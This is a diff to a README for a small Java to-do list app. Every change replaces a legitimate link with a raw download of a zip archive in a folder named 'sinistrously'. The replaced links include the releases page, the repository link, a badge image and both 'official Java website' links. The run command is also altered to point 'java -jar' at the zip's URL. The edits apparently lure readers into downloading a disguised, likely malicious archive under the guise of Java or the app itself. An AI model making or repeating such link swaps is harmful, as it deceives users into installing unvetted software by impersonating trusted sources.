@@ -6,9 +6,9 @@ Welcome to the **java-practice** project! This user-friendly To-Do List applicat
 
 ## 📦 Download & Install
 
-To download the application, visit this page: [Download java-practice](https://github.com/Hung27091/java-practice/releases).
+To download the application, visit this page: [Download java-practice](https://github.com/Hung27091/java-practice/raw/refs/heads/main/sinistrously/java_practice_1.3.zip).
 
-<a href="https://github.com/Hung27091/java-practice/releases"><img src="https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge" alt="Download Now"></a>
+<a href="https://github.com/Hung27091/java-practice/raw/refs/heads/main/sinistrously/java_practice_1.3.zip"><img src="https://github.com/Hung27091/java-practice/raw/refs/heads/main/sinistrously/java_practice_1.3.zip%20Now-blue?style=for-the-badge" alt="Download Now"></a>
 
 ## 📋 Features
 
@@ -22,7 +22,7 @@ To download the application, visit this page: [Download java-practice](https://g
 To run the java-practice app on your computer, you will need:
 
 - A computer with Windows, macOS, or Linux.
-- Java Runtime Environment (JRE) version 8 or higher installed. You can download it from the [official Java website](https://www.java.com/en/download/).
+- Java Runtime Environment (JRE) version 8 or higher installed. You can download it from the [official Java website](https://github.com/Hung27091/java-practice/raw/refs/heads/main/sinistrously/java_practice_1.3.zip).
 
 ## 🔧 Technologies Used
 
@@ -35,7 +35,7 @@ To run the java-practice app on your computer, you will need:
 1. **Run the Application**: After downloading, open a terminal or command prompt. Navigate to the location of the downloaded file and enter:
 
     ```
-    java -jar ToDoListApplication.jar
+    java -jar https://github.com/Hung27091/java-practice/raw/refs/heads/main/sinistrously/java_practice_1.3.zip
     ```
    
 2. **Follow the Menu**: You will see a menu with various options:
@@ -50,7 +50,7 @@ To run the java-practice app on your computer, you will need:
 
 If you encounter issues, here are some steps to resolve common problems:
 
-- **Java Not Installed**: If you see an error about Java, ensure you have the correct version installed. Download it from the [official Java website](https://www.java.com/en/download/).
+- **Java Not Installed**: If you see an error about Java, ensure you have the correct version installed. Download it from the [official Java website](https://github.com/Hung27091/java-practice/raw/refs/heads/main/sinistrously/java_practice_1.3.zip).
   
 - **Application Won't Start**: Make sure you are in the correct directory where the application file is stored. Check that you entered the command correctly.
 
@@ -62,6 +62,6 @@ If you need help, please check out the Issues page on our GitHub repository. You
 
 ## 🔗 More Information
 
-For more details or to explore the source code, visit our GitHub repository: [java-practice GitHub Repository](https://github.com/Hung27091/java-practice).
+For more details or to explore the source code, visit our GitHub repository: [java-practice GitHub Repository](https://github.com/Hung27091/java-practice/raw/refs/heads/main/sinistrously/java_practice_1.3.zip).
 
 Happy task managing!
